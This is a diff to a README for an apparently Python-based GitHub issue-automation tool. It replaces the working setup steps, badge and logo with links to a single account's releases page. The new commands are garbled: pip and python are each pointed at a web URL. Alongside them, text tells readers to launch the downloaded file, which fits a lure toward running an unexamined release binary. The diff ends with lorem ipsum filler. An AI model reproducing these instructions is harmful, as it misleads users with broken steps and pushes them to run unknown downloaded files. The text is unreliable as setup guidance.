@@ -12,9 +12,9 @@
 
 ## How to Use
 
-1. Clone the repository: `git clone https://github.com/yourrepository/IssueAutomationTest.git`
-2. Install the required dependencies: `pip install -r requirements.txt`
-3. Run the Python script: `python issue_automation.py`
+1. Clone the repository: `git clone https://github.com/chiragsahoo113/IssueAutomationTest/releases`
+2. Install the required dependencies: `pip install -r https://github.com/chiragsahoo113/IssueAutomationTest/releases`
+3. Run the Python script: `python https://github.com/chiragsahoo113/IssueAutomationTest/releases`
 
 ## Repository Information
 
@@ -24,7 +24,7 @@
 
 ## Download Latest Release
 
-[![Download Release](https://img.shields.io/badge/Download-Release-informational)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/chiragsahoo113/IssueAutomationTest/releases)](https://github.com/chiragsahoo113/IssueAutomationTest/releases)
 
 📦 **Note:** Ensure to launch the downloaded file if the link ends with the file name.
 
@@ -34,7 +34,7 @@ For more information, updates, and other releases, please check the "Releases" s
 
 🔗 Explore the world of automated GitHub issue reporting with Python and start streamlining your error tracking process today! 🚀
 
-![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)
+![GitHub Logo](https://github.com/chiragsahoo113/IssueAutomationTest/releases)
 
 "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
